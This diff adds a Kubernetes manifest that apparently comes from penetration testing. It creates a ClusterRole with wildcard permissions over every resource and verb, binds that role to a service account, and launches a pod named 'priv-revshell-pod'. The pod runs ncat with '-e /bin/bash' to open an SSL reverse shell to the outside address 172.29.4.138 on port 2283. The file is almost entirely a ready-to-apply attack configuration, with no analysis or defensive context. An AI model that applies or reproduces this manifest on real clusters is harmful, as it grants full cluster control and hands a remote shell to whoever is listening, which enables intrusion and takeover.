@@ -1,0 +1,42 @@
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: chill-guy
+rules:
+- apiGroups:
+  - '*'
+  resources:
+  - '*'
+  verbs:
+  - '*'
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: chill-guy
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: chill-guy
+subjects:
+- kind: ServiceAccount
+  namespace: default
+  name: chill-guy
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: chill-guy
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: priv-revshell-pod
+  labels:
+    app: pentest
+spec:
+  containers:
+  - name: priv-pod
+    image: raesene/ncat
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "ncat --ssl 172.29.4.138 2283 -e /bin/bash;" ]
